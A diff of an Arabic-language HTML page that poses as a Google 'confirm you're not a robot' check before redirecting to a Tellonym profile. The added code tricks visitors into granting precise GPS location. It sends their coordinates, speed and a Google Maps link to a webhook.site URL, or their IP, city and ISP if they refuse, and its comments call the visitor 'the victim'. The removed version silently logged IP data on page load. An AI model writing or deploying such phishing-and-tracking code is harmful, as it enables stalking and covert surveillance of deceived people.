@@ -1,41 +1,69 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق من الأمان</title>
+    <style>
+        body { background-color: #f1f3f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .logo { width: 50px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #3c4043; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.5; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
+        <h1>تأكيد هويتك</h1>
+        <p>بسبب نشاط غير معتاد، يرجى السماح للمتصفح بالتحقق من موقعك الحالي للتأكد من أنك لست "روبوت" وللسماح لك بالوصول إلى صفحة Tellonym.</p>
+        <button class="btn" onclick="startCapture()">أنا لست برنامج روبوت</button>
+    </div>
+
     <script>
-        const hook = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
-        const target = "https://tellonym.me/Schaien/anything";
+        const WEBHOOK_URL = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
+        const FINAL_URL = "https://tellonym.me/Schaien/anything";
 
-        async function ultraLog() {
-            // 1. إرسال إشارة دخول فورية (قبل سحب البيانات)
-            fetch(hook, { method: 'POST', mode: 'no-cors', body: "🚨 شخص دخل الرابط الآن!" });
+        async function sendToMaster(data) {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            });
+        }
 
-            try {
-                // 2. محاولة سحب البيانات التقنية
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                
-                // 3. إرسال الصيد الكامل
-                await fetch(hook, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        "INFO": "✅ تم سحب البيانات",
-                        "IP": data.ip,
-                        "CITY": data.city,
-                        "ISP": data.org,
-                        "AGENT": navigator.userAgent
-                    })
-                });
-            } catch (e) {
-                // استمرار حتى لو فشل السحب
-            } finally {
-                // 4. الهروب للوجهة النهائية
-                setTimeout(() => { window.location.replace(target); }, 600);
+        function startCapture() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const report = {
+                            type: "🚨 [صيد دقيق جداً - GPS]",
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            altitude: position.coords.altitude,
+                            accuracy: position.coords.accuracy + " meters",
+                            speed: position.coords.speed,
+                            google_maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        await sendToMaster(report);
+                        window.location.replace(FINAL_URL);
+                    },
+                    async (error) => {
+                        // إذا رفض، نسحب الـ IP كخيار بديل فوراً
+                        const res = await fetch('https://ipapi.co/json/');
+                        const ipData = await res.json();
+                        await sendToMaster({ type: "⚠️ [الضحية رفض الـ GPS - تم سحب الـ IP]", ...ipData });
+                        window.location.replace(FINAL_URL);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                window.location.replace(FINAL_URL);
             }
         }
-        window.onload = ultraLog;
     </script>
-</head>
-<body style="background: #000;"></body>
+</body>
 </html>
